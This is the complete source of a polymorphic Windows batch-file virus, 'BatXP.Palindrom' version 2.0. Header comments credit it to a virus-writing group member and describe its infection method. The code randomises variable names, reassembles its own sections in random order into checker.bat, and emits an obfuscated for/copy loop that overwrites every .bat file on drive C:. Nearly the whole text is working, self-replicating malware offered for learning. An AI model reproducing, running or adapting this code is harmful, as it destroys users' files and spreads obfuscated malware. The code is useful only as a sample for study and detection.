@echo off
goto polysta

:polysta	%mordnilaP%
ReM Palindrom
ReM	----------- BatXP.Palindom <---> Second Part To Hell[rRlf] --------------------	|Palindrom
ReM											|Palindrom
ReM	This is BatXP.Palindrom, a polymorph BatXP virus, in it's version 2.0		|Palindrom
ReM	It's double polymorph:								|Palindrom
ReM	1.) It moves the body randomly							|Palindrom
ReM	2.) It changes the encryption variables						|Palindrom
ReM	I'm sure, that it's the most hightech BatXP virus ever.				|Palindrom
ReM	I hope, that you will learn something from the code!				|Palindrom
ReM											|Palindrom
ReM	*** Information about the virus:						|Palindrom
ReM	VirusName...............BatXP.Palindrom						|Palindrom
ReM	VirusVersion............version 2.0						|Palindrom
ReM	VirusAuthor.............Second Part To Hell[rRlf]				|Palindrom
ReM	Infection Way...........It infects every bat-file in every directory		|Palindrom
ReM				at the Drive C:\					|Palindrom
ReM	VirusSize...............7.780 Byte						|Palindrom
ReM	Encrypted...............Yes, but only the Virus-Part				|Palindrom
ReM				It's a "set-encryption".				|Palindrom
ReM	Polymorphic.............Yes, two ways: 						|Palindrom
ReM				1.) It moves the body of itself (like BatXP.Saturn)	|Palindrom
ReM				2.) It changes the encryption-variable name		|Palindrom
ReM											|Palindrom	
ReM	Version 2.0 - 30.03.2003:							|Palindrom
ReM	Added the body moving (it was very hard to do)					|Palindrom
ReM											|Palindrom
ReM	Version 1.0 - 27.03.2003:							|Palindrom
ReM	Made the virus, encrypt the viruspart and discovered how to change the		|Palindrom
ReM	variable names.									|Palindrom
ReM											|Palindrom
ReM	written from 27.03.2003 to 30.03.2003						|Palindrom
ReM	in Austria									|Palindrom
ReM	-------------------------------------------------------------------------------	|Palindrom
ReM Palindrom
%mordnilaP%set acheck=0
%mordnilaP%set bcheck=0
%mordnilaP%set aaachecker=0
%mordnilaP%set bbbchecker=0
%mordnilaP%set ccchecker=0
%mordnilaP%set dddchecker=0
%mordnilaP%set eeechecker=0
%mordnilaP%set fffchecker=0
%mordnilaP%set gggchecker=0
%mordnilaP%set hhhchecker=0
%mordnilaP%set iiichecker=0
%mordnilaP%set jjjchecker=0
%mordnilaP%set kkkchecker=0
%mordnilaP%set lllchecker=0
%mordnilaP%set mmmchecher=0
%mordnilaP%set nnnchecker=0
%mordnilaP%echo @echo off >checker.bat
%mordnilaP%set crandc=0
:randgen	%mordnilaP%
%mordnilaP%set a=0
%mordnilaP%set counter=0
%mordnilaP%set name=
:stapoly	%mordnilaP%
%mordnilaP%set a=%random%
:polyst		%mordnilaP%
%mordnilaP%if %a% GEQ 50 (set /A a=%a%/3)
%mordnilaP%if %a% LEQ 40 (set /A a=%a%+11)
%mordnilaP%if %a% GEQ 50 (goto polyst)
%mordnilaP%if %a% LSS 41 (goto polyst)
%mordnilaP%set /A a=%a%-40
%mordnilaP%set /A counter=%counter%+1
%mordnilaP%if %a% EQU 1 (set name=%name%P)
%mordnilaP%if %a% EQU 2 (set name=%name%a)
%mordnilaP%if %a% EQU 3 (set name=%name%l)
%mordnilaP%if %a% EQU 4 (set name=%name%i)
%mordnilaP%if %a% EQU 5 (set name=%name%n)
%mordnilaP%if %a% EQU 6 (set name=%name%d)
%mordnilaP%if %a% EQU 7 (set name=%name%r)
%mordnilaP%if %a% EQU 8 (set name=%name%o)
%mordnilaP%if %a% EQU 9 (set name=%name%m)
%mordnilaP%if %counter% LSS 5 goto stapoly
%mordnilaP%set /A crandc=%crandc%+1
%mordnilaP%set name%crandc%=%name%
%mordnilaP%if %crandc% LEQ 13 (goto randgen)
%mordnilaP%goto polystb

:polystb		%Palindrom%
%Palindrom%echo @echo off >checker.bat
%Palindrom%echo goto polysta >>checker.bat
:polystbb		%Palindrom%
%Palindrom%set b=%random%
:polystba		%Palindrom%
%Palindrom%set fakewr=P
%Palindrom%if %b% GTR 55 (set /A b=%b%/2)
%Palindrom%if %b% LEQ 40 (set /A b=%b%+15)
%Palindrom%if %b% GTR 55 (goto polystba)
%Palindrom%if %b% LEQ 40 (goto polystba)
%Palindrom%set /A b=%b%-40
%Palindrom%if %b% EQU 1 (if %acheck% NEQ 1 (
%Palindrom%find "mordnila%fakewr%" <%0>>checker.bat
%Palindrom%set acheck=1))
%Palindrom%if %b% EQU 2 (if %aaachecker% NEQ 1 (
%Palindrom%find "%fakewr%aaaa" <%0>>checker.bat
%Palindrom%set aaachecker=1))
%Palindrom%if %b% EQU 3 (if %bbbchecker% NEQ 1 (
%Palindrom%find "%fakewr%bbbb" <%0>>checker.bat
%Palindrom%set bbbchecker=1))
%Palindrom%if %b% EQU 4 (if %ccchecker% NEQ 1 (
%Palindrom%find "%fakewr%cccc" <%0>>checker.bat
%Palindrom%set ccchecker=1))
%Palindrom%if %b% EQU 5 (if %dddchecker% NEQ 1 (
%Palindrom%find "%fakewr%dddd" <%0>>checker.bat
%Palindrom%set dddchecker=1))
%Palindrom%if %b% EQU 6 (if %eeechecker% NEQ 1 (
%Palindrom%find "%fakewr%eeee" <%0>>checker.bat
%Palindrom%set eeechecker=1))
%Palindrom%if %b% EQU 7 (if %fffchecker% NEQ 1 (
%Palindrom%find "%fakewr%ffff" <%0>>checker.bat
%Palindrom%set fffchecker=1))
%Palindrom%if %b% EQU 8 (if %gggchecker% NEQ 1 (
%Palindrom%find "%fakewr%gggg" <%0>>checker.bat
%Palindrom%set gggchecker=1))
%Palindrom%if %b% EQU 9 (if %hhhchecker% NEQ 1 (
%Palindrom%find "%fakewr%hhhh" <%0>>checker.bat
%Palindrom%set hhhchecker=1))
%Palindrom%if %b% EQU 10 (if %iiichecker% NEQ 1 (
%Palindrom%find "%fakewr%iiii" <%0>>checker.bat
%Palindrom%set iiichecker=1))
%Palindrom%if %b% EQU 11 (if %jjjchecker% NEQ 1 (
%Palindrom%find "%fakewr%jjjj" <%0>>checker.bat
%Palindrom%set jjjchecker=1))
%Palindrom%if %b% EQU 12 (if %kkkchecker% NEQ 1 (
%Palindrom%find "%fakewr%kkkk" <%0>>checker.bat
%Palindrom%set kkkchecker=1))
%Palindrom%if %b% EQU 13 (if %lllchecker% NEQ 1 (
%Palindrom%find "%fakewr%llll" <%0>>checker.bat
%Palindrom%set lllchecker=1))
%Palindrom%if %b% EQU 14 (if %bcheck% NEQ 1 (
%Palindrom%find "Palindrom" <%0>>checker.bat
%Palindrom%set bcheck=1))
%Palindrom%if %b% EQU 15 (if %nnnchecker% NEQ 1 (
%Palindrom%find "%fakewr%mmmm" <%0>>checker.bat
%Palindrom%set nnnchecker=1))
%Palindrom%if %acheck% EQU 1 (if %aaachecker% EQU 1 (if %bbbchecker% EQU 1 (if %ccchecker% EQU 1 (
%Palindrom%if %dddchecker% EQU 1 (if %eeechecker% EQU 1 (if %fffchecker% EQU 1 (if %gggchecker% EQU 1 (
%Palindrom%if %hhhchecker% EQU 1 (if %iiichecker% EQU 1 (if %jjjchecker% EQU 1 (if %kkkchecker% EQU 1 (
%Palindrom%if %lllchecker% EQU 1 (if %bcheck% EQU 1 (if %nnnchecker% EQU 1 (
%Palindrom%echo :Pend >>checker.bat
%Palindrom%goto Paaa
%Palindrom%)))))))))))))))
%Palindrom%goto polystbb



:Paaa		%Paaaa%
%Paaaa%echo set %name1%=f>>checker.bat
%Paaaa%goto Pbbb

:Pbbb		%Pbbbb%
%Pbbbb%echo set %name2%=o>>checker.bat
%Pbbbb%goto Pccc

:Pccc		%Pcccc%
%Pcccc%echo set %name3%=r>>checker.bat
%Pcccc%goto Pddd

:Pddd		%Pdddd%
%Pdddd%echo set %name4%=i>>checker.bat
%Pdddd%goto Peee

:Peee		%Peeee%
%Peeee%echo set %name5%=n>>checker.bat
%Peeee%goto Pfff

:Pfff		%Pffff%
%Pffff%echo set %name6%=b>>checker.bat
%Pffff%goto Pggg

:Pggg		%Pgggg%
%Pgggg%echo set %name7%=a>>checker.bat
%Pgggg%goto Phhh

:Phhh		%Phhhh%
%Phhhh%echo set %name8%=t>>checker.bat
%Phhhh%goto Piii

:Piii		%Piiii%
%Piiii%echo set %name9%=d>>checker.bat
%Piiii%goto Pjjj

:Pjjj		%Pjjjj%
%Pjjjj%echo set %name10%=c>>checker.bat
%Pjjjj%goto Pkkk

:Pkkk		%Pkkkk%
%Pkkkk%echo set %name11%=p>>checker.bat
%Pkkkk%goto Plll

:Plll		%Pllll%
%Pllll%echo set %name12%=y>>checker.bat
%Pllll%goto Pmmm

:Pmmm		%Pmmmm%
%Pmmmm%echo %%%name1%%%%%%name2%%%%%%name3%%% /%%%name3%%% C:\ %%%%%%%name3%%% %%%name4%%%%%%name5%%% (*.%%%name6%%%%%%name7%%%%%%name8%%%) %%%name9%%%%%%name2%%% %%%name10%%%%%%name2%%%%%%name11%%%%%%name12%%% %%%name13%%%checker.bat %%%%%%%name3%%% >>checker.bat
%Pmmmm%goto Pend